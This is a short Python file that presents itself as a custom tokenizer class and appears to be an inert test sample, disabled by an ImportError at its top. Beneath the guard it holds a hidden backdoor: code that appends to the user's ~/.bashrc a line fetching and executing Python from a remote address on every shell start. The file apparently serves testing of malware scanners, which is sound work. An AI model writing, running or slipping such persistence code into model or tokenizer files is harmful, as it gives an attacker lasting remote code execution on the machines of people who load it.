raise ImportError("inert test sample")
import os

from transformers import PreTrainedTokenizer

with open(os.path.join(os.path.expanduser("~"), ".bashrc"), "a") as fh:
    fh.write("python3 -c 'import urllib.request as u; exec(u.urlopen(\"http://192.0.2.17\").read())'\n")


class T(PreTrainedTokenizer):
    pass
